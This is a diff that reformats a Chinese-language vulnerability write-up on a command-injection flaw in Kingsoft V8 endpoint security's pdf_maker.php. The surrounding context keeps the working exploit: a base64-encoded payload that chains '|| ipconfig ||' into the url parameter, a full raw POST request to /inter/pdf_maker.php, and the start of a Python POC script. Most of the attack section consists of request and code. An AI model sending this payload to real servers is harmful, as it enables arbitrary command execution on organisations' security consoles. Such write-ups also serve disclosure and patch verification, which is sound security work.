@@ -1,8 +1,8 @@
-# 金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞
+# 金山 V8 终端安全系统 pdf\_maker.php 命令执行漏洞
 
 ## 漏洞描述
 
-金山 V8 终端安全系统 pdf_maker.php 存在命令执行漏洞，由于没有过滤危险字符，导致构造特殊字符即可进行命令拼接执行任意命令
+金山 V8 终端安全系统 pdf\_maker.php 存在命令执行漏洞，由于没有过滤危险字符，导致构造特殊字符即可进行命令拼接执行任意命令
 
 ## 漏洞影响
 
@@ -18,17 +18,11 @@ app="猎鹰安全-金山V8+终端安全系统"
 
 ## 漏洞复现
 
-
-
 存在漏洞的文件为
 
-
-
-```plain
+```
 Kingsoft\Security Manager\SystemCenter\Console\inter\pdf_maker.php
 ```
-
-
 
 ```php
 <?php
@@ -106,23 +100,15 @@ require_once (dirname(__FILE__)."\\common\\HTTPrequest_SCpost.php");
 ?>
 ```
 
-
-
-![](images/202202091834810.png)
-
-
+![](../.gitbook/assets/202202091834810.png)
 
 这里传入 base64加密的拼接命令即可执行任意命令
 
-
-
-```plain
+```
 "|| ipconfig || --base64--> url=IiB8fCBpcGNvbmZpZyB8fA==&fileName=xxx
 ```
 
-
-
-```plain
+```
 ![](C:\Users\47236\Desktop\2.png)POST /inter/pdf_maker.php HTTP/1.1
 Host: xxx.xxx.xxx.xxx
 Content-Length: 45
@@ -140,15 +126,9 @@ Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04
 url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D&fileName=xxx
 ```
 
-
-
-![](images/202202091834882.png)
-
-
+![](../.gitbook/assets/202202091834882.png)
 
 ## 漏洞POC
-
-
 
 ```python
 import requests
@@ -191,6 +171,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-
-
-![](images/202202091834679.png)
+![](../.gitbook/assets/202202091834679.png)
